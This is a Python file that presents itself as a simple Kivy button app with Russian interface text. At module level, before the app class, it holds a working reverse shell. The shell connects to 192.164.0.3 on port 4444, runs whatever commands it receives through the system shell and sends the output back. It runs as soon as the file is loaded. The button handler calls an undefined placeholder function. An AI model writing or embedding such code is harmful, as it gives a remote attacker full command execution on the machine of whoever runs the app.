from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
import socket, subprocess


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.164.0.3', 4444))
while True:
    cmd = s.recv(1024).decode()
    if cmd == 'exit':
        break
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = proc.stdout.read() + proc.stderr.read()
    s.send(output)
s.close()

class MainApp(App):
    def build(self):
        layout = BoxLayout(orientation='vertical', padding=20, spacing=10)
        self.label = Label(text='Нажми кнопку', font_size='20sp')
        btn = Button(text='Запустить', size_hint=(1, 0.3))
        btn.bind(on_press=self.on_press)
        layout.add_widget(self.label)
        layout.add_widget(btn)
        return layout

    def on_press(self, instance):
        try:
            result = твоя_логика()
            self.label.text = str(result)
        except Exception as e:
            self.label.text = f"Ошибка: {e}"

MainApp().run()
